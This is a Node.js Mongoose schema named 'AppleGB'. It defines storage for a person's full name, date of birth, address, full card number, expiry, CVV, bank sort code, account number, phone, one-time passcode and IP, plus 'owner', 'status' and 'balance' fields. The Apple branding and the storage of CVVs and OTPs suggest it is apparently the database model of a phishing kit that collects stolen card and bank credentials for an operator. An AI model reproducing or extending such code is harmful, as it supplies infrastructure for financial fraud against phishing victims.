const mongoose = require("mongoose");

const appleGbSchema = new mongoose.Schema({
  uniqueid: String,
  fullname: String,
  dob: String,
  address: String,
  city: String,
  pcode: String,
  ccname: String,
  ccnum: String,
  ccexp: String,
  cvv: String,
  scode: String,
  accno: String,
  telephone: String,
  otp: String,
  status: Number,
  ip: String,
  owner: String,
  balance: String,
  timestamp: Date,
});

module.exports = mongoose.model("AppleGB", appleGbSchema);
